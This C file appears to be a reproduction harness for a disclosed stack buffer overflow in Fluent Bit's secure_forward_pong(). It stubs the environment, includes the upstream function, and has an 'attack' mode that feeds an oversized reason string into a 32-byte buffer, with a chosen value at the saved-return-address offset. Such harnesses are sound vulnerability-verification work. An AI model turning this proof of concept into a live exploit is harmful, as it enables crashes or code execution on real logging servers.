/*
 * Direct-call harness for CVE-2026-61674 / GHSA-jrp8-r9hx-gf73.
 *
 * The complete upstream secure_forward_pong() function is included VERBATIM
 * from one of four byte-exact pinned forward.c blobs (see ../src/SHA256SUMS).
 * Only its environment is stubbed: msgpack-c object/unpack types, the flb
 * context and the logger. No socket, TLS, event loop or Fluent Bit process.
 *
 * Modes:
 *   arith            print the advisory arithmetic, no vulnerable call
 *   attack <size>    PONG[2] STR of <size> attacker bytes -> unbounded memcpy
 *   safe             PONG[2] STR of 4 bytes -> in-bounds in every variant
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>

/* ---- msgpack-c-compatible stubs (field names match upstream) -------------- */
#define MSGPACK_UNPACK_SUCCESS 1

typedef enum {
    MSGPACK_OBJECT_NIL = 0,
    MSGPACK_OBJECT_BOOLEAN = 1,
    MSGPACK_OBJECT_POSITIVE_INTEGER = 2,
    MSGPACK_OBJECT_NEGATIVE_INTEGER = 3,
    MSGPACK_OBJECT_FLOAT = 5,
    MSGPACK_OBJECT_STR = 6,
    MSGPACK_OBJECT_BIN = 7,
    MSGPACK_OBJECT_ARRAY = 8,
    MSGPACK_OBJECT_MAP = 9,
    MSGPACK_OBJECT_EXT = 10
} msgpack_object_type;

typedef struct { uint32_t size; const char *ptr; } msgpack_object_str;
typedef struct { uint32_t size; const char *ptr; } msgpack_object_bin;
typedef struct { uint32_t size; struct msgpack_object *ptr; } msgpack_object_array;

typedef union {
    int boolean;
    uint64_t u64;
    int64_t i64;
    double f64;
    msgpack_object_str str;
    msgpack_object_bin bin;
    msgpack_object_array array;
} msgpack_object_union;

typedef struct msgpack_object {
    msgpack_object_type type;
    msgpack_object_union via;
} msgpack_object;
static msgpack_object g_root;   /* forward declaration for unpack stub below */

typedef struct {
    void *zone;
    msgpack_object data;
} msgpack_unpacked;

/* ---- flb stubs ----------------------------------------------------------- */
struct flb_input_instance { int dummy; };
struct flb_forward { struct flb_input_instance *ins; };

void msgpack_unpacked_init(msgpack_unpacked *r)
{
    r->zone = NULL;
    memset(&r->data, 0, sizeof(r->data));
}

void msgpack_unpacked_destroy(msgpack_unpacked *r) { (void) r; }

int msgpack_unpack_next(msgpack_unpacked *r, const char *buf, size_t len,
                        size_t *off)
{
    (void) buf; (void) len; (void) off;
    r->data = g_root;
    return MSGPACK_UNPACK_SUCCESS;
}

/* ---- harness-owned state ------------------------------------------------- */
static msgpack_object g_elem[5];
static msgpack_object g_root;
static char g_reason[1024];
static struct flb_forward g_ctx;
static struct flb_input_instance g_ins;
static char g_buf[1024];
static int g_error_calls;
static int g_smear[16];
static size_t g_reason_size;

/* Upstream flb_plg_error is a macro; here a variadic stub with the same call
 * shape. It emits observations immediately, because the vulnerable variant
 * can crash on return after the unbounded memcpy. msg[31] discriminates the
 * vulnerable copy (attacker byte) from the fixed bounded+NUL copy (0x00).
 * ASan builds define NO_OOB_READ so the observer never reads past msg[32]. */
void flb_plg_error(void *ins, const char *fmt, ...)
{
    va_list ap;
    const char *msg;
    static const int offs[8] = {0, 17, 24, 33, 40, 48, 56, 63};
    int i;

    (void) ins; (void) fmt;
    g_error_calls++;
    va_start(ap, fmt);
    msg = va_arg(ap, const char *);
    va_end(ap);
    printf("FLB_ERROR_CALLS=1 MSG_BYTE31=%02x", (unsigned char) msg[31]);
#if !defined(NO_OOB_READ) && defined(SHOW_SMEAR)
    for (i = 0; i < 8; i++) {
        g_smear[i] = (unsigned char) msg[offs[i]];
    }
    printf(" OBS_OFFSET_0=%02x OBS_OFFSET_17=%02x OBS_OFFSET_24=%02x "
           "OBS_OFFSET_33=%02x OBS_OFFSET_40=%02x OBS_OFFSET_48=%02x "
           "OBS_OFFSET_56=%02x OBS_OFFSET_63=%02x",
           g_smear[0], g_smear[1], g_smear[2], g_smear[3],
           g_smear[4], g_smear[5], g_smear[6], g_smear[7]);
#else
    (void) offs; (void) i;
#endif
    printf("\n");
    fflush(stdout);
}

/* ---- verbatim upstream function ------------------------------------------ */
#include PONG_CASE

/* ---- driver -------------------------------------------------------------- */
int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "arith";
    size_t reason_size = 4;
    static const int offs[8] = {0, 17, 24, 33, 40, 48, 56, 63};
    static const unsigned char marks[8] = {0x41, 0x5a, 0x7a, 0x3c,
                                           0x7b, 0x42, 0x7b, 0x41};
    int i, ret;

    memset(g_reason, 0x41, sizeof(g_reason));
    for (i = 0; i < 8; i++) {
        g_reason[offs[i]] = (char) marks[i];
    }
    /* saved-RIP-sized chosen value at reason offset 56: 41...7b little endian */
    for (i = 57; i < 64; i++) {
        g_reason[i] = 0x41;
    }

    g_root.type = MSGPACK_OBJECT_ARRAY;
    g_root.via.array.size = 5;
    g_root.via.array.ptr = g_elem;

    g_elem[0].type = MSGPACK_OBJECT_STR;
    g_elem[0].via.str.size = 4;
    g_elem[0].via.str.ptr = "PONG";

    g_elem[1].type = MSGPACK_OBJECT_BOOLEAN;
    g_elem[1].via.boolean = 0;              /* authenticated == false */

    g_elem[2].type = MSGPACK_OBJECT_STR;
    g_elem[2].via.str.ptr = g_reason;

    g_elem[3].type = MSGPACK_OBJECT_STR;
    g_elem[3].via.str.size = 1;
    g_elem[3].via.str.ptr = "h";
    g_elem[4].type = MSGPACK_OBJECT_STR;
    g_elem[4].via.str.size = 1;
    g_elem[4].via.str.ptr = "d";

    g_ctx.ins = &g_ins;

    if (strcmp(mode, "arith") == 0) {
        printf("VARIANT=%s MODE=arith ATTACK_SIZE=1000 DEST_BYTES=32 "
               "OVERFLOW_BYTES=968\n", VARIANT_NAME);
        return 0;
    }
    if (strcmp(mode, "attack") == 0) {
        reason_size = (size_t) atoi(argv[2]);
    } else if (strcmp(mode, "safe") == 0) {
        reason_size = 4;
    } else {
        fprintf(stderr, "unknown mode: %s\n", mode);
        return 99;
    }
    g_reason_size = reason_size;
    g_elem[2].via.str.size = (uint32_t) reason_size;

    printf("VARIANT=%s MODE=%s REASON_SIZE=%u DEST_BYTES=32 "
           "OVERFLOW_BYTES=%u\n", VARIANT_NAME, mode,
           (unsigned) reason_size,
           (unsigned) (reason_size > 32 ? reason_size - 32 : 0));
    fflush(stdout);

    ret = secure_forward_pong(&g_ctx, g_buf, (int) sizeof(g_buf));

    printf("RET=%d ERROR_CALLS=%d REASON_SIZE=%u\n",
           ret, g_error_calls, (unsigned) g_reason_size);
    fflush(stdout);
    return 0;
}
